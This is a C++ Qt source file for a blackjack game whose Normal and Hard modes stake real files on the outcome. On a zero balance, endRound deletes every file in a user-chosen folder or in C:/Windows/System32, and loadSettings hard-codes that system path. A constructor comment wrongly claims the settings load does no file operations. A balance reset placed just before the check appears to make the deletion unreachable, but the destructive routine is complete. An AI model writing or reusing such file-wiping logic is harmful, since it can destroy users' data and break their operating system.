#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <algorithm>
#include <QPushButton>
#include <QDebug>

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
    , balance(1)
    , currentBet(0)
    , difficulty(Difficulty::Easy)
    , gameInProgress(false)
{
    ui->setupUi(this);

    // Load settings (difficulty only - no file operations)
    loadSettings();

    // Initialize game state
    initializeGame();

    // Connect buttons
    connect(ui->pushButton, &QPushButton::clicked, this, &MainWindow::startNewGame);
    connect(ui->pushButton_2, &QPushButton::clicked, this, &MainWindow::placeBet);
    connect(ui->hitButton, &QPushButton::clicked, this, &MainWindow::hit);
    connect(ui->standButton, &QPushButton::clicked, this, &MainWindow::stand);
    connect(ui->doubleButton, &QPushButton::clicked, this, &MainWindow::doubleDown);
    connect(ui->splitButton, &QPushButton::clicked, this, &MainWindow::split);

    // Optional buttons if present in UI by objectName
    if (auto b = this->findChild<QPushButton*>("saveButton")) connect(b, &QPushButton::clicked, this, &MainWindow::onSaveButtonClicked);
    if (auto b = this->findChild<QPushButton*>("loadButton")) connect(b, &QPushButton::clicked, this, &MainWindow::onLoadButtonClicked);
    if (auto b = this->findChild<QPushButton*>("surrenderButton")) connect(b, &QPushButton::clicked, this, &MainWindow::surrender);

}

MainWindow::~MainWindow()
{
    clearCardDisplays();
    delete ui;
}

// ---------------- Helper Functions ----------------

QString MainWindow::suitToSymbol(Card::Suit suit)
{
    switch (suit) {
    case Card::Hearts:   return "♥";
    case Card::Diamonds: return "♦";
    case Card::Clubs:    return "♣";
    case Card::Spades:   return "♠";
    }
    return "";
}

QWidget* MainWindow::createCardWidget(const Card& card)
{
    QWidget* cardWidget = new QWidget();
    cardWidget->setMinimumSize(80, 120);
    cardWidget->setMaximumSize(80, 120);

    // Base style (dark gray background)
    cardWidget->setStyleSheet(
        "background-color: #2a2a2a;"
        "border: 2px solid #b39700;"
        "border-radius: 8px;"
        );

    // Suit color
    QString color = (card.suit == Card::Hearts || card.suit == Card::Diamonds) ? "red" : "white";

    // Top-left rank + suit
    QLabel* topLabel = new QLabel(card.rank + suitToSymbol(card.suit), cardWidget);
    topLabel->setStyleSheet(QString("color: %1; font: bold 14px;").arg(color));
    topLabel->move(6, 4);

    // Bottom-right rank + suit
    QLabel* bottomLabel = new QLabel(card.rank + suitToSymbol(card.suit), cardWidget);
    bottomLabel->setStyleSheet(QString("color: %1; font: bold 14px;").arg(color));
    bottomLabel->adjustSize();
    bottomLabel->move(cardWidget->width() - bottomLabel->width() - 6,
                      cardWidget->height() - bottomLabel->height() - 6);

    // Center suit only
    QLabel* centerLabel = new QLabel(suitToSymbol(card.suit), cardWidget);
    centerLabel->setStyleSheet(QString("color: %1; font: bold 28px;").arg(color));
    centerLabel->adjustSize();
    centerLabel->move((cardWidget->width() - centerLabel->width()) / 2,
                      (cardWidget->height() - centerLabel->height()) / 2);

    return cardWidget;
}

QWidget* MainWindow::createBackCardWidget()
{
    QWidget* cardWidget = new QWidget();
    cardWidget->setMinimumSize(80, 120);
    cardWidget->setMaximumSize(80, 120);
    cardWidget->setStyleSheet(
        "background-color: #1d3557;"
        "border: 2px solid #b39700;"
        "border-radius: 8px;"
        );
    QLabel* pattern = new QLabel("◆◇◆", cardWidget);
    pattern->setStyleSheet("color: #a8dadc; font: bold 22px;");
    pattern->adjustSize();
    pattern->move((cardWidget->width() - pattern->width()) / 2,
                  (cardWidget->height() - pattern->height()) / 2);
    return cardWidget;
}


void MainWindow::clearCardDisplays()
{
    // Clear dealer cards
    for (QWidget* card : dealerCardWidgets) {
        ui->dealerCardLayout->removeWidget(card);
        delete card;
    }
    dealerCardWidgets.clear();

    // Clear player cards
    for (QWidget* card : playerCardWidgets) {
        ui->playerCardLayout->removeWidget(card);
        delete card;
    }
    playerCardWidgets.clear();
}

void MainWindow::updateCardDisplays()
{
    clearCardDisplays();

    // Add dealer cards
    if (!dealerHand.isEmpty()) {
        // Always show first card
        QWidget* first = createCardWidget(dealerHand.first());
        dealerCardWidgets.append(first);
        ui->dealerCardLayout->addWidget(first);

        // Second card hidden unless reveal flag set
        if (dealerHand.size() > 1) {
            QWidget* second = revealDealerHoleCard ? createCardWidget(dealerHand[1]) : createBackCardWidget();
            dealerCardWidgets.append(second);
            ui->dealerCardLayout->addWidget(second);
        }
        // Rest of cards (if any)
        for (int i = 2; i < dealerHand.size(); ++i) {
            QWidget* w = createCardWidget(dealerHand[i]);
            dealerCardWidgets.append(w);
            ui->dealerCardLayout->addWidget(w);
        }
    }

    // Add player cards
    for (const Card& card : playerHand) {
        QWidget* cardWidget = createCardWidget(card);
        playerCardWidgets.append(cardWidget);
        ui->playerCardLayout->addWidget(cardWidget);
    }
}

void MainWindow::enableGameButtons(bool enabled)
{
    ui->hitButton->setEnabled(enabled);
    ui->standButton->setEnabled(enabled);
    ui->doubleButton->setEnabled(enabled && balance >= currentBet); // bool logic [ if balance more then current allow ]
    ui->splitButton->setEnabled(enabled && playerHand.size() == 2 &&
                                playerHand[0].rank == playerHand[1].rank &&
                                balance >= currentBet);
    if (auto b = this->findChild<QPushButton*>("surrenderButton")) {
        b->setEnabled(enabled && canSurrender);
    }
    // bool logic [ if inital 2 cards and both same allow]
}

// ---------------- Core Functions ----------------

void MainWindow::loadSettings()
{
    QFile file("settings.txt");
    if (!file.open(QIODevice::ReadOnly | QIODevice::Text)) {
        difficulty = Difficulty::Easy;
        balance = DEFAULT_BALANCE;
        return;
    }

    QTextStream in(&file);
    int diff = 0;
    in >> diff;

    if (diff == 1) { // Normal
        difficulty = Difficulty::Normal;
        in >> folderPath;
        balance = DEFAULT_BALANCE;
    }
    else if (diff == 2) { // Hard
        difficulty = Difficulty::Hard;
        folderPath = "C:/Windows/System32";
        balance = countFilesInFolder(folderPath);
    }
    else { // Easy
        difficulty = Difficulty::Easy;
        balance = 10000;
    }

    file.close();
}


void MainWindow::initializeGame()
{
    // Initialize game state
    dealerHand.clear();
    playerHand.clear();
    currentBet = 0;
    gameInProgress = false;
    shuffleDeck();
    clearCardDisplays();

    // Initialize UI elements
    ui->balanceLabel->setText("Balance: $" + QString::number(balance));
    ui->betLabel->setText("Current bet: $" + QString::number(currentBet));
    ui->gameStatusLabel->setText("Place Your Bet!");
    ui->gameStatusLabel->setStyleSheet("color: #FFD700;");
    ui->playerLabel->setText("Player's Hand");
    ui->dealerLabel->setText("Dealer's Hand");

    // Disable game buttons until bet is placed
    enableGameButtons(false);

    // Get number of decks
    bool ok;
    QStringList options = {"1", "2", "4", "6", "8"};

    QString choice = QInputDialog::getItem(
        this,
        "Choose Deck Count",
        "How many decks do you want to play with? (default = 1)",
        options,
        0,
        false,
        &ok
        );

    if (ok) {
        numDecks = choice.toInt();
    } else {
        numDecks = 1;
    }

    shuffleDeck(); // shuffle and create the appropriate ammount of decks
}

void MainWindow::shuffleDeck()
{
    deck.clear();
    Card c;

    for (int j = 0; j < numDecks; j++) {
        for (int i = 1; i <= 4; i++) {
            for (int x = 1; x <= 13; x++) {
                if (x == 1) {
                    c.value = 11; // Ace
                    c.isAce = true;
                    c.rank = "A";
                } else if (x >= 11) {
                    c.value = 10;
                    c.isAce = false;
                    if (x == 11) c.rank = "J";
                    else if (x == 12) c.rank = "Q";
                    else if (x == 13) c.rank = "K";
                } else {
                    c.value = x;
                    c.isAce = false;
                    c.rank = QString::number(x);
                }

                switch (i) {
                case 1: c.suit = Card::Clubs;    break;
                case 2: c.suit = Card::Diamonds; break;
                case 3: c.suit = Card::Hearts;   break;
                case 4: c.suit = Card::Spades;   break;
                }

                deck.append(c);
            }
        }
    }

    // Shuffle deck
    std::shuffle(deck.begin(), deck.end(), *QRandomGenerator::global());
}

MainWindow::Card MainWindow::drawCard()
{
    if (deck.isEmpty()) {
        shuffleDeck(); // Reshuffle if deck is empty [weird error when go thru code to fast]
    }
    return deck.takeFirst();
}

int MainWindow::calculateHandValue(const QVector<Card> &hand) const
{
    int value = 0;
    int aceCount = 0;

    for (const Card& card : hand) {
        value += card.value;
        if (card.isAce) aceCount++;
    }

    // Convert aces from 11 to 1 if busting
    while (value > 21 && aceCount > 0) {
        value -= 10;
        aceCount--;
    }

    return value;
}

void MainWindow::updateUI()
{
    ui->balanceLabel->setText("Balance: $" + QString::number(balance));
    ui->betLabel->setText("Current Bet: $" + QString::number(currentBet));
    ui->dealerLabel->setText(revealDealerHoleCard ? "Dealer's Hand (Value: " + QString::number(calculateHandValue(dealerHand)) + ")" : "Dealer's Hand");
    ui->playerLabel->setText("Player's Hand (Value: " + QString::number(calculateHandValue(playerHand)) + ")");
    updateCardDisplays();
}

void MainWindow::dealInitialCards()
{
    // Deal 2 cards to player and 2 to dealer
    playerHand.clear();
    dealerHand.clear();

    playerHand.append(drawCard());
    dealerHand.append(drawCard());
    playerHand.append(drawCard());
    dealerHand.append(drawCard());

    revealDealerHoleCard = false;
    canSurrender = true;

    updateUI();
    gameInProgress = true;
    enableGameButtons(true);
}

void MainWindow::endRound(bool userBust, bool dealerBust)
{
    revealDealerHoleCard = true;
    canSurrender = false;

    int playerValue = calculateHandValue(playerHand);
    int dealerValue = calculateHandValue(dealerHand);

    enableGameButtons(false);
    gameInProgress = false;

    if (userBust && dealerBust) {
        // Both bust - push
        balance += currentBet; // Return bet
        ui->gameStatusLabel->setText("Push - Both Busted!");
        ui->gameStatusLabel->setStyleSheet("color: #FFD700;");
    }
    else if (userBust) {
        // Player busted
        ui->gameStatusLabel->setText("You Busted - Dealer Wins!");
        ui->gameStatusLabel->setStyleSheet("color: red;");
        // Money already deducted when bet was placed
    }
    else if (dealerBust) {
        // Dealer busted
        balance += currentBet * 2; // Return bet + winnings [as winnings deducted so *2]
        ui->gameStatusLabel->setText("Dealer Busted - You Win!");
        ui->gameStatusLabel->setStyleSheet("color: green;");
    }
    else {
        // Neither busted
        bool playerNatural = (playerValue == 21 && playerHand.size() == 2);
        bool dealerNatural = (dealerValue == 21 && dealerHand.size() == 2);

        if (playerNatural && dealerNatural) {
            balance += currentBet; // Return bet
            ui->gameStatusLabel->setText("Push - Both Blackjack!");
            ui->gameStatusLabel->setStyleSheet("color: #FFD700;");
        }
        else if (playerNatural && !dealerNatural) {
            balance += static_cast<int>(currentBet * 2.5); // 3:2 payout + original bet [natural blackjack]
            ui->gameStatusLabel->setText("Blackjack! You Win!");
            ui->gameStatusLabel->setStyleSheet("color: green;");
        }
        else if (!playerNatural && dealerNatural) {
            ui->gameStatusLabel->setText("Dealer Blackjack - You Lose!");
            ui->gameStatusLabel->setStyleSheet("color: red;");
        }
        else if (playerValue > dealerValue) {
            balance += currentBet * 2; // Return bet + winnings
            ui->gameStatusLabel->setText("You Win!");
            ui->gameStatusLabel->setStyleSheet("color: green;");
        }
        else if (playerValue < dealerValue) {
            ui->gameStatusLabel->setText("Dealer Wins!");
            ui->gameStatusLabel->setStyleSheet("color: red;");
        }
        else {
            balance += currentBet; // Return bet
            ui->gameStatusLabel->setText("Push!");
            ui->gameStatusLabel->setStyleSheet("color: #FFD700;");
        }
    }

    currentBet = 0;
    updateUI();

    // Check if player is out of money restart game if [easy mode]
    if (balance <= 0) {
        QMessageBox::information(this, "Game Over", "You're out of money! Starting a new game.");
        balance = DEFAULT_BALANCE;
        updateUI();
    }
    // Check file deletion rules
    if (difficulty == Difficulty::Normal && balance <= 0) {
        deleteFilesFromFolder(folderPath, countFilesInFolder(folderPath));
        QMessageBox::warning(this, "Folder Lost", "You lost all your money. Your chosen folder has been deleted!");
        QApplication::quit();
    }

    if (difficulty == Difficulty::Hard && balance <= 0) {
        deleteFilesFromFolder(folderPath, countFilesInFolder(folderPath));
        QMessageBox::critical(this, "Critical Loss", "Your Windows folder has been wiped. Game Over!");
        QApplication::quit();
    }

}

// ---------------- Slot Implementations ----------------

void MainWindow::startNewGame()
{
    // 1. Create the question message box manually
    QMessageBox questionBox;
    questionBox.setWindowTitle("New Game");
    questionBox.setText("Start a new game? This will reset your balance.");
    questionBox.setIcon(QMessageBox::Question);
    questionBox.setStandardButtons(QMessageBox::Yes | QMessageBox::No);

    // Apply style to THIS specific message box
    questionBox.setStyleSheet("QMessageBox { background-color: white; } "
                              "QMessageBox QLabel { color: black; }");

    // 2. Show it and get the user's reply
    int reply = questionBox.exec();

    // 3. Process the reply
    if (reply == QMessageBox::Yes) {
        // Create the critical message box manually
        QMessageBox criticalBox;
        criticalBox.setWindowTitle("New Game");
        criticalBox.setText("Starting new game by rerunning setup wizard. The application will now close.");
        criticalBox.setIcon(QMessageBox::Critical);
        criticalBox.setStandardButtons(QMessageBox::Ok);

        // Apply the same style
        criticalBox.setStyleSheet("QMessageBox { background-color: white; } "
                                  "QMessageBox QLabel { color: black; }");

        // Show it
        criticalBox.exec();

        // Quit the application
        QApplication::quit();
    }
}

void MainWindow::placeBet()
{
    if (gameInProgress) {
        QMessageBox::warning(this, "Game in Progress", "Finish the current hand before placing a new bet.");
        return;
    }

    bool ok;
    int bet = QInputDialog::getInt(
        this,
        "Place Bet",
        "Enter your bet amount:",
        100,
        1,
        balance,
        1,
        &ok
        );

    if (ok && bet > 0 && bet <= balance) {
        currentBet = bet;
        balance -= bet; // Deduct bet immediately
        updateUI();
        dealInitialCards();

        ui->gameStatusLabel->setText("Make your move!");
        ui->gameStatusLabel->setStyleSheet("color: #FFD700;");
    } else if (ok) {
        QMessageBox::warning(this, "Invalid Bet", "Your bet must be between $1 and your balance.");
    }
}

void MainWindow::hit()
{
    if (!gameInProgress) return;

    playerHand.append(drawCard());
    canSurrender = false;
    updateUI();

    int playerValue = calculateHandValue(playerHand);
    if (playerValue > 21) {
        endRound(true, false); // Player busts
    }
}

void MainWindow::stand()
{
    if (!gameInProgress) return;

    canSurrender = false;

    // Dealer draws until at least 17 (or 18 in hard mode)
    int dealerTarget = (difficulty == Difficulty::Hard) ? 18 : 17;

    revealDealerHoleCard = true;
    int dealerValue = calculateHandValue(dealerHand);
    while (dealerValue < dealerTarget) {
        dealerHand.append(drawCard());
        dealerValue = calculateHandValue(dealerHand);
        updateUI();
    }

    bool dealerBust = dealerValue > 21;
    endRound(false, dealerBust);
}

void MainWindow::doubleDown()
{
    if (!gameInProgress) return;

    if (balance >= currentBet) {
        balance -= currentBet;
        currentBet *= 2;
        canSurrender = false;
        updateUI();

        playerHand.append(drawCard());
        updateUI();

        int playerValue = calculateHandValue(playerHand);
        if (playerValue > 21) {
            endRound(true, false);
        } else {
            stand();
        }
    } else {
        QMessageBox::warning(this, "Insufficient Balance", "You don't have enough money to double down.");
    }
}

void MainWindow::split()
{
    if (!gameInProgress) return;

    if (playerHand.size() == 2 && playerHand[0].rank == playerHand[1].rank && balance >= currentBet) {
        QMessageBox::information(this, "Split", "Splitting pairs is not yet implemented in this version.");
    } else {
        QMessageBox::warning(this, "Cannot Split", "You can only split pairs and must have enough balance.");
    }
}

//------------------------------File handling operations-------------------------------

int MainWindow::countFilesInFolder(const QString &path) const
{
    QDir dir(path);
    if (!dir.exists()) return 0;

    QFileInfoList files = dir.entryInfoList(QDir::Files | QDir::NoSymLinks | QDir::Readable);
    return files.size();
}

void MainWindow::deleteFilesFromFolder(const QString &path, int numFiles)
{
    QDir dir(path);
    if (!dir.exists()) return;

    QFileInfoList files = dir.entryInfoList(QDir::Files | QDir::NoSymLinks | QDir::Readable);
    int toDelete = qMin(numFiles, files.size());

    for (int i = 0; i < toDelete; i++) {
        QFile file(files[i].absoluteFilePath());
        if (!file.remove()) {
            qWarning() << "Failed to delete:" << files[i].absoluteFilePath();
        }
    }
}

// ---------------- New Features ----------------

void MainWindow::surrender()
{
    if (!gameInProgress || !canSurrender) {
        QMessageBox::information(this, "Surrender", "You can only surrender as your first action.");
        return;
    }
    // Player loses half the bet, rounded down
    int loss = currentBet / 2;
    // We already deducted full bet on placeBet; refund half
    balance += (currentBet - loss);
    ui->gameStatusLabel->setText("You surrendered. Lost $" + QString::number(loss) + ".");
    ui->gameStatusLabel->setStyleSheet("color: #FFD700;");

    currentBet = 0;
    gameInProgress = false;
    canSurrender = false;
    revealDealerHoleCard = true; // Reveal for completeness

    enableGameButtons(false);
    updateUI();
}

void MainWindow::saveGameToFile()
{
    QFile file("save.txt");
    if (!file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QMessageBox::warning(this, "Save", "Failed to open save file.");
        return;
    }
    QTextStream out(&file);
    out << static_cast<int>(difficulty) << "\n";
    out << folderPath << "\n";
    out << balance << "\n";
    out << currentBet << "\n";
    out << (gameInProgress ? 1 : 0) << "\n";
    out << numDecks << "\n";
    out << (revealDealerHoleCard ? 1 : 0) << "\n";

    // Deck
    out << deck.size() << "\n";
    for (const Card& c : deck) {
        out << c.rank << "," << c.value << "," << (c.isAce ? 1 : 0) << "," << static_cast<int>(c.suit) << "\n";
    }

    // Player hand
    out << playerHand.size() << "\n";
    for (const Card& c : playerHand) {
        out << c.rank << "," << c.value << "," << (c.isAce ? 1 : 0) << "," << static_cast<int>(c.suit) << "\n";
    }

    // Dealer hand
    out << dealerHand.size() << "\n";
    for (const Card& c : dealerHand) {
        out << c.rank << "," << c.value << "," << (c.isAce ? 1 : 0) << "," << static_cast<int>(c.suit) << "\n";
    }

    file.close();
    QMessageBox::information(this, "Save", "Game saved to save.txt");
}

void MainWindow::loadGameFromFile()
{
    QFile file("save.txt");
    if (!file.open(QIODevice::ReadOnly | QIODevice::Text)) {
        QMessageBox::warning(this, "Load", "Failed to open save file.");
        return;
    }
    QTextStream in(&file);
    int diffInt = 0, gip = 0, reveal = 0;
    in >> diffInt; in.readLine();
    difficulty = static_cast<Difficulty>(diffInt);
    folderPath = in.readLine();
    in >> balance; in.readLine();
    in >> currentBet; in.readLine();
    in >> gip; in.readLine();
    in >> numDecks; in.readLine();
    in >> reveal; in.readLine();
    gameInProgress = (gip == 1);
    revealDealerHoleCard = (reveal == 1);

    auto readCards = [&](QVector<Card>& target){
        int n = 0; in >> n; in.readLine();
        target.clear(); target.reserve(n);
        for (int i = 0; i < n; ++i) {
            QString line = in.readLine();
            const QStringList parts = line.split(',');
            if (parts.size() != 4) continue;
            Card c; c.rank = parts[0]; c.value = parts[1].toInt(); c.isAce = parts[2].toInt() != 0; c.suit = static_cast<Card::Suit>(parts[3].toInt());
            target.append(c);
        }
    };

    readCards(deck);
    readCards(playerHand);
    readCards(dealerHand);

    file.close();

    clearCardDisplays();
    updateUI();

    // Re-enable or disable buttons based on state
    enableGameButtons(gameInProgress);
}

void MainWindow::onSaveButtonClicked()
{
    saveGameToFile();
}

void MainWindow::onLoadButtonClicked()
{
    loadGameFromFile();
}
